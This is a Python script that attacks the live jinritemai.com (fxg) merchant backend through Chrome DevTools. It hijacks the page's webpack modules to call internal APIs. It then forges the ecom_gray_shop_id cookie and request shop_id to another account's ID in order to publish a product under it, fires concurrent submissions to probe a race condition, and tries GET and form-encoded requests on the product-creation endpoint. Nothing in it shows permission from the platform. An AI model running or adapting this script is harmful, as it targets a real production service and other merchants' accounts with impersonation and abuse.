# -*- coding: utf-8 -*-
"""最终漏洞扫描: cookie伪造 / 并发提交 / GET方法 / Content-Type / header注入"""
import json, time, datetime, random, sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from urllib.request import urlopen
import websocket

targets = json.loads(urlopen('http://127.0.0.1:9222/json/list', timeout=3).read())
t = next((x for x in targets if 'jinritemai.com' in (x.get('url') or '')), targets[0])
ws = websocket.create_connection(t['webSocketDebuggerUrl'], timeout=10, suppress_origin=True)
ws.settimeout(3)
mid = [0]

def cdp(m, p=None, timeout=20):
    mid[0] += 1
    ws.send(json.dumps({'id': mid[0], 'method': m, 'params': p or {}}))
    dl = time.time() + timeout
    while time.time() < dl:
        try:
            raw = ws.recv()
            msg = json.loads(raw)
            if msg.get('id') == mid[0]:
                return msg
            # Capture network responses
            if msg.get('method') == 'Network.responseReceived':
                resp = msg.get('params', {}).get('response', {})
                url = resp.get('url', '')
                if 'addWithSchema' in url:
                    print(f'  [NET] status={resp.get("status")} url={url[:120]}')
        except:
            continue
    return {}

cdp('Runtime.enable')
cdp('Network.enable')
cdp('Page.enable')

# Navigate to create page
cdp('Page.navigate', {'url': 'https://fxg.jinritemai.com/ffa/g/create'})
time.sleep(5)

r = cdp('Runtime.evaluate', {
    'expression': '''
        (function() {
            var chunkName = Object.keys(window).find(function(k) { return k.includes('@ecom-mcenter/ffa-goods'); });
            window[chunkName].push([[Math.floor(Math.random() * 1e9)], {}, function(req) { window.__fxgWebpackRequire = req; }]);
            var req = window.__fxgWebpackRequire;
            window.__fxgPost = req(90665).bE;
            window.__fxgGet = req(28974).J;

            // Read current cookies
            var allCookies = document.cookie;
            var shopId = '';
            var cookies = document.cookie.split(';');
            for (var i = 0; i < cookies.length; i++) {
                var c = cookies[i].trim();
                if (c.startsWith('ecom_gray_shop_id=')) shopId = c.split('=')[1];
            }
            window.__originalShopId = shopId;
            return JSON.stringify({shopId: shopId, cookieLen: allCookies.length});
        })()
    ''', 'returnByValue': True, 'awaitPromise': True, 'timeout': 10000
})
val = ((r.get('result') or {}).get('result') or {}).get('value', '')
sess = json.loads(val) if isinstance(val, str) else (val or {})
print(f'Current shop_id={sess.get("shopId")} cookies={sess.get("cookieLen")}chars')
print()

# ============================================================
# Test 1: 修改 ecom_gray_shop_id cookie 再提交
# ============================================================
print('='*60)
print('Test 1: Cookie伪造 - 修改 ecom_gray_shop_id')
print('='*60)

# 改成旧账号的 shop_id
FAKE_SHOP_ID = '155450371'

r = cdp('Runtime.evaluate', {
    'expression': f'''
        (function() {{
            // Set the cookie to fake shop_id
            document.cookie = 'ecom_gray_shop_id={FAKE_SHOP_ID}; domain=.jinritemai.com; path=/';
            document.cookie = 'ecom_gray_shop_id={FAKE_SHOP_ID}; domain=fxg.jinritemai.com; path=/';

            // Verify
            var shopId = '';
            var cookies = document.cookie.split(';');
            for (var i = 0; i < cookies.length; i++) {{
                var c = cookies[i].trim();
                if (c.startsWith('ecom_gray_shop_id=')) shopId = c.split('=')[1];
            }}
            return JSON.stringify({{newShopId: shopId}});
        }})()
    ''', 'returnByValue': True, 'timeout': 5000
})
val = ((r.get('result') or {}).get('result') or {}).get('value', '')
print(f'After cookie change: {val[:200]}')

# Submit with the faked shop_id
now = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
nt = now + ''.join(random.choices('0123456789ABCDEF', k=20))

body_mini = {
    'schema':{'model':{
        'title':{'value':'Cookie伪造测试中筒袜验证'},
        'short_product_name':{'value':''},'title_prefix':{'value':''},'title_suffix':{'value':''},'title_use_brand_name':{'value':False},
        'goods_category':{'value':{'category_leaf_id':1000010267,'first_cid':1000003282,'first_cname':'A'}},
        'category_properties':{'value':{'1687':[{'value_id':'596120136','value_name':'无品牌'}],'1577':[{'value_id':'1991','value_name':'通用'}],'1865':[{'value_id':'31904','value_name':'中筒袜'}],'785':[{'value_id':'','value_name':'棉100%','measure_info':{'template_id':873,'values':[{'module_id':1854,'value':'棉'},{'module_id':1855,'value':'100','unit_id':15,'unit_name':'%'}]}}]}},
        'category_property_pic':{'value':{}},'pic':{'value':[]},'main_image_three_to_four':{'value':[]},'white_background_pic':{'value':[]},'description':{'value':''},
        'spec_detail':{'value':[{'id':'10000','cp_id':2752,'name':'颜色分类','spec_values':[{'id':'996874532588296918','name':'默认','cpv_id':0,'cpv_path':[],'img_url':None}]},{'id':'20000','cp_id':3939,'name':'码数','spec_values':[{'id':'990897920130195435','name':'均码','cpv_id':0,'cpv_path':[],'img_url':None}]}]},
        'sku_detail':{'value':[{'id':'fake-cookie','stock_info':{'stock_num':100},'sku_status':True,'confirm_no_barcode':False,'spec_detail_ids':['996874532588296918','990897920130195435'],'price':'9.9'}]},
        'freight_id':{'value':'300713474'},'pickup_method':{'value':'0'},'start_sale_type':{'value':'0'},'product_type':{'value':'0'},'presell_type':{'value':'0'},'delivery_delay_day':{'value':'2'},'reduce_type':{'value':'1'},'qualification':{'value':{}},'after_sale':{'value':{'quality_problem_return':{'option_id':None,'selected':True},'supply_day_return_selector':{'option_id':'7-1','selected':True}}},'ai_gen_spec':{'value':{'ai_gen_spec_type':0}},'alli_promotion_plan_switch':{'value':False},'area_stock_switcher':{'value':False},'goods_category_appeal':{'value':False},'interest_free_activity':{'value':[]},'interest_free_activity_id':{'value':{}},'interest_free_open':{'value':True},'reference_price_enable':{'value':False},'detail_prettify_uri':{'value':''},
    },'context':{'ability':[],'biz_identity':'xiaodian','business_code':'xiaodian','capability_codes':['standard_capability'],'category_id':'1000010267','fast_publish_type':'','feature':{'session_publish_id':'helper_fake','session_data':'{}','not_first_render':'1','product_sale_property_control':'1','sale_property_sequence_variable':'1','min_sku_price':'990'},'identity_extension':'{}','model_type':'','n_token':nt,'operation_type':'normal','product_id':'0','shop_id':FAKE_SHOP_ID,'token':nt,'version':'v1_v8_v9_v10_v11_v12'}},
    'category_id':'1000010267','context':{'ability':[],'biz_identity':'xiaodian','business_code':'xiaodian','capability_codes':['standard_capability'],'category_id':'1000010267','fast_publish_type':'','feature':{'session_publish_id':'helper_fake','session_data':'{}','not_first_render':'1','product_sale_property_control':'1','sale_property_sequence_variable':'1','min_sku_price':'990'},'identity_extension':'{}','model_type':'','n_token':nt,'operation_type':'normal','product_id':'0','shop_id':FAKE_SHOP_ID,'token':nt,'version':'v1_v8_v9_v10_v11_v12'},
    'pass_through_extra':{},'request_extra':{},'check_status':0,'session':{},'appid':1,
}
body_json = json.dumps(body_mini, ensure_ascii=False)
r = cdp('Runtime.evaluate', {
    'expression': f'''
        (async function() {{
            var result = await window.__fxgPost('/product/tproduct/addWithSchema?check_status=0', {body_json}, {{timeout: 30000}});
            return JSON.stringify({{code: result.code||result.errno, msg: result.msg||'', pid: result.data ? (typeof result.data === "string" ? JSON.parse(result.data).product_id : result.data.product_id) : null}});
        }})()
    ''', 'returnByValue': True, 'awaitPromise': True, 'timeout': 40000
})
val = ((r.get('result') or {}).get('result') or {}).get('value', '')
result = json.loads(val) if isinstance(val, str) else (val or {})
print(f'Fake shop_id={FAKE_SHOP_ID}: code={result.get("code")} pid={result.get("pid","")} msg={result.get("msg","")[:100]}')

# ============================================================
# Test 2: 并发提交 (同时发2个)
# ============================================================
print()
print('='*60)
print('Test 2: 并发提交 (race condition)')
print('='*60)

# Restore original cookie first
r = cdp('Runtime.evaluate', {
    'expression': f'''
        (function() {{
            document.cookie = 'ecom_gray_shop_id={sess.get("shopId","177886360")}; domain=.jinritemai.com; path=/';
            return JSON.stringify({{restored: true}});
        }})()
    ''', 'returnByValue': True, 'timeout': 5000
})

# Submit 2 requests simultaneously
nt2 = datetime.datetime.now().strftime('%Y%m%d%H%M%S') + 'CONCURRENTTEST'
body_mini2 = json.loads(body_json)  # Copy
body_mini2['schema']['model']['title']['value'] = '并发测试A中筒袜验证'
body_mini3 = json.loads(body_json)
body_mini3['schema']['model']['title']['value'] = '并发测试B中筒袜验证'
body_mini2['schema']['context']['n_token'] = nt2 + 'A'
body_mini3['schema']['context']['n_token'] = nt2 + 'B'

bj2 = json.dumps(body_mini2, ensure_ascii=False)
bj3 = json.dumps(body_mini3, ensure_ascii=False)

r = cdp('Runtime.evaluate', {
    'expression': f'''
        (async function() {{
            var p1 = window.__fxgPost('/product/tproduct/addWithSchema?check_status=0', {bj2}, {{timeout: 30000}});
            var p2 = window.__fxgPost('/product/tproduct/addWithSchema?check_status=0', {bj3}, {{timeout: 30000}});
            var results = await Promise.all([p1, p2]);
            return JSON.stringify(results.map(function(r) {{
                return {{code: r.code||r.errno, msg: r.msg||'', pid: r.data ? (typeof r.data === "string" ? JSON.parse(r.data).product_id : r.data.product_id) : null}};
            }}));
        }})()
    ''', 'returnByValue': True, 'awaitPromise': True, 'timeout': 60000
})
val = ((r.get('result') or {}).get('result') or {}).get('value', '')
results = json.loads(val) if isinstance(val, str) else (val or [])
for i, res in enumerate(results):
    print(f'  Concurrent #{i+1}: code={res.get("code")} pid={res.get("pid","")} msg={res.get("msg","")[:80]}')

# ============================================================
# Test 3: GET 方法调用 addWithSchema
# ============================================================
print()
print('='*60)
print('Test 3: GET method on addWithSchema')
print('='*60)

r = cdp('Runtime.evaluate', {
    'expression': '''
        (async function() {
            var result = await window.__fxgGet('/product/tproduct/addWithSchema?check_status=0', {timeout: 10000});
            return JSON.stringify({code: result.code||result.errno, msg: result.msg||''});
        })()
    ''', 'returnByValue': True, 'awaitPromise': True, 'timeout': 15000
})
val = ((r.get('result') or {}).get('result') or {}).get('value', '')
result = json.loads(val) if isinstance(val, str) else (val or {})
print(f'  GET addWithSchema: code={result.get("code")} msg={result.get("msg","")[:80]}')

# ============================================================
# Test 4: 直接用 fetch API 绕过 webpack
# ============================================================
print()
print('='*60)
print('Test 4: Native fetch with different Content-Type')
print('='*60)

r = cdp('Runtime.evaluate', {
    'expression': f'''
        (async function() {{
            var body = {body_json};
            var resp = await fetch('/product/tproduct/addWithSchema?check_status=0', {{
                method: 'POST',
                headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
                body: 'check_status=0&category_id=1000010267',
                credentials: 'include'
            }});
            var text = await resp.text();
            return text.substring(0, 300);
        }})()
    ''', 'returnByValue': True, 'awaitPromise': True, 'timeout': 30000
})
val = ((r.get('result') or {}).get('result') or {}).get('value', '')
print(f'  Form-urlencoded: {val[:300]}')

print()
print('Done. All vulnerability scans complete.')

ws.close()
